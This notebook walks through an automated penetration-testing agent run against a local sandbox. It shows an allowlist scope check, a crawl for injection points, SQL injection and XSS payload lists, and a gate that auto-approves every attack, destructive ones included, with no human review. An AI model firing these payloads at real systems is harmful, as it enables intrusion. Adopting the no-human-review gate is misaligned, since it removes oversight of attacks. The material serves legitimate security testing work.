# Offensive IT-Tester — Layer-by-Layer Walkthrough

A live, cell-by-cell run of the seven-layer agent. Each section runs **one layer** and
shows what it produced, so you can watch a target go from *URL* → *discovered injection
points* → *selected payloads* → *governance gate* → *fired attacks* → **confirmed exploits**
→ *report*, with a tamper-evident audit trail underneath.

> **Target.** By default this auto-starts our self-owned Flask sandbox (`127.0.0.1:5000`) so
> the notebook always runs. To use **DVWA** instead, set `TARGET`/`PROFILE` in the config cell
> (DVWA must be running in Docker on `:8080`).

## 0. Setup — imports, project path, and start the target

In [1]:
import sys, subprocess, time, socket, json
from pathlib import Path
import pandas as pd
from IPython.display import display, Markdown

# make the project importable regardless of where the kernel starts
for _p in [Path.cwd(), *Path.cwd().parents]:
    if (_p / "config" / "paths.py").exists():
        if str(_p) not in sys.path: sys.path.insert(0, str(_p))
        ROOT = _p; break

pd.set_option("display.max_colwidth", 60)

# ---------------- CONFIG: which target to test ----------------
TARGET  = "http://127.0.0.1:5000"   # self-owned Flask sandbox (auto-started below)
PROFILE = "pyapp"                    # <- for DVWA use TARGET=".:8080", PROFILE="dvwa"
# --------------------------------------------------------------

PORT = int(TARGET.rsplit(":", 1)[1])
def _up(port):
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=1): return True
    except OSError: return False

_sandbox = None
if PROFILE == "pyapp" and not _up(PORT):
    _sandbox = subprocess.Popen([sys.executable, str(ROOT / "sandbox" / "target_app.py")],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(20):
        if _up(PORT): break
        time.sleep(0.5)

print(f"target  : {TARGET}")
print(f"profile : {PROFILE}")
print(f"reachable: {_up(PORT)}")

target  : http://127.0.0.1:5000
profile : pyapp
reachable: True


## Layer 1 — Authorization (the scope firewall)

Approves a URL only if it is on the allowlist (`config/target_allowlist.yaml`) **and** is a
loopback address. Everything else is rejected by default — this is the legal safety wall.

In [2]:
from src.authorization.authorize import authorize

print("Checking targets against the allowlist:\n")
for url in [TARGET, "http://example.com", "http://127.0.0.1:9999"]:
    d = authorize(url)
    print(f"  [{'APPROVED' if d.approved else 'REJECTED'}]  {url:26}  ->  {d.reason}")

decision = authorize(TARGET)
assert decision.approved, "target must be authorized to continue"
print("\n=> proceeding: target is in scope.")

Checking targets against the allowlist:

  [APPROVED]  http://127.0.0.1:5000       ->  allowlisted: Local Flask sandbox (sandbox/target_app.py)
  [REJECTED]  http://example.com          ->  host 'example.com' is not loopback (require_loopback=true)
  [REJECTED]  http://127.0.0.1:9999       ->  127.0.0.1:9999 is not on the allowlist

=> proceeding: target is in scope.


## Layer 2 — Reconnaissance (live crawl)

Actually connects to the target, crawls its pages, and parses forms + URL parameters to
**discover** the injection points (it does not read them from a file).

In [3]:
from src.recon.recon import discover

points = discover(TARGET, PROFILE)
print(f"Live crawl discovered {len(points)} injection points:\n")
display(pd.DataFrame([{"point": p.name, "method": p.method, "param": p.param,
                       "bucket": p.bucket, "classes": ",".join(p.classes),
                       "url": p.full_url} for p in points]))

Live crawl discovered 6 injection points:



,point,method,param,bucket,classes,url
0,sqli,GET,user,login_form,sqli,http://127.0.0.1:5000/sqli
1,xss,GET,name,search_field,"xss,sqli",http://127.0.0.1:5000/xss
2,comment,POST,comment,comment_field,"xss,csrf",http://127.0.0.1:5000/comment
3,exec,POST,ip,command_exec,cmdi,http://127.0.0.1:5000/exec
4,account,POST,password_new,account_settings,csrf,http://127.0.0.1:5000/account
5,fetch,GET,url,ssrf_target,ssrf,http://127.0.0.1:5000/fetch


## Layer 3 — Selection (stratified by technique)

For each injection point, pick payloads from the labelled arsenal — grouped by technique so
no technique is skipped — each tagged with the oracle that will later verify it.

In [4]:
from src.intelligence.select import select_all

selection = select_all(points, k_per_type=2)
rows = [{"point": pt.name, "class": p["attack_class"], "type": p["type"],
         "severity": p["severity"], "oracle": p["oracle"],
         "destructive": p["is_destructive"], "payload": p["payload"][:38]}
        for pt, payloads in selection for p in payloads]
df_sel = pd.DataFrame(rows)

print(f"Selected {len(df_sel)} payloads.  Technique coverage per class:")
for cls in sorted(df_sel["class"].unique()):
    techs = ", ".join(sorted(df_sel[df_sel["class"] == cls]["type"].unique()))
    print(f"   {cls:5} -> {techs}")
display(df_sel)

Selected 25 payloads.  Technique coverage per class:
   cmdi  -> Command Injection
   csrf  -> CSRF
   sqli  -> blind-time, boolean-blind, tautology, union
   ssrf  -> SSRF
   xss   -> reflected, stored


,point,class,type,severity,oracle,destructive,payload
0,sqli,sqli,tautology,high,differential,False,' OR 1=1#
1,sqli,sqli,boolean-blind,high,differential,False,"' OR SUBSTRING(user(),1,1)='a'/*"
2,sqli,sqli,tautology,high,differential,False,' OR 1=1--
3,sqli,sqli,boolean-blind,high,differential,False,"' OR SUBSTRING(user(),1,1)='c'--"
4,xss,xss,stored,high,browser_execution,False,<script>alert('XSS3')</script>
5,xss,xss,reflected,medium,browser_execution,False,<svg onload=alert('XSS7')>
6,xss,xss,stored,high,browser_execution,False,"<input oninput='alert(""XSS38"")'>"
7,xss,xss,reflected,medium,browser_execution,False,<body onload=alert('XSS8')>
8,xss,sqli,boolean-blind,high,differential,False,' AND 1=1--
9,xss,sqli,tautology,high,differential,False,' OR 1=1-- -


## Layer 4 — Governance gate (automated policy, no human in the loop)

The agent fires **autonomously** — a person can't review a large, variable payload count, so a
human-in-the-loop would be a bottleneck. Instead the gate decides **by rule**: on this
authorized, disposable sandbox it **approves everything to fire**, but **flags destructive
payloads** in the audit for transparency. (`allow_destructive=False` re-imposes an automatic,
rule-based hold for a real engagement — still no human.)

In [5]:
from src.governance import govern

gate = govern(selection)   # automated policy: fire all, flag destructive
print(f"Governance decision: {gate.summary()}\n")
if gate.flagged:
    print("Destructive payloads — FIRED, but flagged in the audit (no human review):")
    display(pd.DataFrame([{"point": pt.name, "class": p["attack_class"],
                           "type": p["type"], "payload": p["payload"][:38]}
                          for pt, p in gate.flagged]))
else:
    print("(no destructive payloads in this selection)")

Governance decision: 25 approved to fire (autonomous)

(no destructive payloads in this selection)


## Layers 5 & 6 — Execution → Detection (verify successful exploitation)

Fire each **approved** payload at the target, then confirm with the oracle assigned to it —
compare against a benign baseline, or a planted signal. Only genuine exploits are marked
confirmed (see `docs/oracles_explained.md`).

In [6]:
from src.recon.recon import build_session
from src.execution import baseline
from src.detection import detect
from src.agent.layer_tools import finding_dict

session = build_session(TARGET, PROFILE)
base_cache, findings = {}, []
for pt, p in gate.approved:
    if pt.full_url not in base_cache:
        base_cache[pt.full_url] = baseline(session, pt)
    conf, _ = detect(session, pt, p, base_cache[pt.full_url])
    findings.append(finding_dict(pt, p, conf))

df_find = pd.DataFrame(findings)
confirmed = df_find[df_find["confirmed"] == True]
print(f"Fired {len(df_find)} payloads.  CONFIRMED {len(confirmed)} real exploit(s):\n")
display(confirmed[["attack_class", "type", "point", "oracle", "confidence", "evidence"]]
        .reset_index(drop=True))

Fired 25 payloads.  CONFIRMED 9 real exploit(s):



,attack_class,type,point,oracle,confidence,evidence
0,sqli,tautology,sqli,differential,medium,"true vs false condition diverged (""' OR 1=2--"" returned ..."
1,xss,stored,xss,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
2,xss,reflected,xss,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
3,xss,stored,xss,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
4,xss,reflected,xss,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
5,sqli,union,xss,marker_reflection,high,payload reflected unescaped in the response (injection p...
6,sqli,union,xss,marker_reflection,high,payload reflected unescaped in the response (injection p...
7,xss,stored,comment,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
8,xss,stored,comment,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...


### The honest half — fired but **not** confirmed

Anything an oracle could not confirm is **not** declared safe. These are flagged as candidates
for manual review (unconfirmed ≠ secure).

In [7]:
unconf = df_find[df_find["confirmed"] != True]
print(f"{len(unconf)} payloads fired but not confirmed — candidates for review, NOT 'safe':\n")
display(unconf[["attack_class", "type", "point", "oracle", "evidence"]]
        .drop_duplicates().reset_index(drop=True))

16 payloads fired but not confirmed — candidates for review, NOT 'safe':



,attack_class,type,point,oracle,evidence
0,sqli,tautology,sqli,differential,true and false conditions matched
1,sqli,boolean-blind,sqli,differential,true and false conditions matched
2,sqli,boolean-blind,xss,differential,true and false conditions matched
3,sqli,tautology,xss,differential,true and false conditions matched
4,sqli,blind-time,xss,timing,no significant delay (0.0s vs 0.0s)
5,csrf,CSRF,comment,state_change,not demonstrable on a local sandbox — needs semi-manual ...
6,cmdi,Command Injection,exec,marker_reflection,payload not reflected unescaped
7,csrf,CSRF,account,state_change,not demonstrable on a local sandbox — needs semi-manual ...
8,ssrf,SSRF,fetch,out_of_band,not demonstrable on a local sandbox — needs an external ...


## Layer 7 — Report

The ground-truth run summary (deterministic). Flip `RUN_LLM = True` to have the local
open-source model (HuggingFace `Qwen2.5-1.5B`) write the prose findings report — slow on CPU.

In [8]:
from src.reporting.report import build_run_summary

state = {"target": TARGET, "profile": PROFILE, "authorized": True, "status": "done",
         "points": points, "findings": findings, "gate": gate}
print(json.dumps(build_run_summary(state), indent=2))

RUN_LLM = False   # <- set True to generate the AI-written report (downloads/loads the model)
if RUN_LLM:
    from src.reporting import generate_report
    display(Markdown(generate_report(state)))

{
  "target": "http://127.0.0.1:5000",
  "profile": "pyapp",
  "authorized": true,
  "status": "done",
  "n_injection_points": 6,
  "n_fired": 25,
  "n_confirmed": 9,
  "n_held": 0,
  "confirmed_by_class": {
    "sqli": 3,
    "xss": 6
  },
  "confirmed_findings": [
    {
      "attack_class": "sqli",
      "type": "tautology",
      "point": "sqli",
      "oracle": "differential",
      "confidence": "medium",
      "evidence": "true vs false condition diverged (\"' OR 1=2--\" returned differently)"
    },
    {
      "attack_class": "xss",
      "type": "stored",
      "point": "xss",
      "oracle": "browser_execution",
      "confidence": "medium",
      "evidence": "payload reflected unescaped into HTML (reflected-XSS candidate); JS execution not verified without a headless browser"
    },
    {
      "attack_class": "xss",
      "type": "reflected",
      "point": "xss",
      "oracle": "browser_execution",
      "confidence": "medium",
      "evidence": "payload reflected unesca

## Underneath it all — the tamper-evident audit ledger

Everything above ran the layers directly. Here we run the **whole agent** once through
LangGraph so every decision is written to the hash-chained ledger, then verify the chain.

In [9]:
from src.agent import build_agent, AuditLog

audit = AuditLog(ROOT / "audit" / "audit.jsonl")
agent = build_agent(audit=audit)
result = agent.invoke({"target": TARGET})
print("Agent run status:", result["status"])

lines = [json.loads(l) for l in open(ROOT / "audit" / "audit.jsonl", encoding="utf-8") if l.strip()]
recent = lines[[i for i, r in enumerate(lines) if r["event"] == "authorize"][-1]:]
display(pd.DataFrame([{"seq": r["seq"], "event": r["event"],
                       "detail": str(r["data"].get("summary") or r["data"].get("reason")
                                     or r["data"].get("points") or "")[:48]} for r in recent]))

ok, msg = AuditLog.verify(ROOT / "audit" / "audit.jsonl")
print(f"\nChain verification: {'OK — ' if ok else 'BROKEN — '}{msg}")

Agent run status: done


,seq,event,detail
0,168,authorize,allowlisted: Local Flask sandbox (sandbox/target
1,169,recon,7
2,170,select,34 payloads across 7 points
3,171,govern,34 approved to fire (autonomous); 2 destructive
4,172,execute_detect,



Chain verification: OK — chain intact


## Cleanup — stop the sandbox

In [ ]:
if _sandbox is not None:
    _sandbox.terminate()
    print("sandbox stopped.")
else:
    print("nothing to stop (used an already-running target).")

nothing to stop (used an already-running target).


: 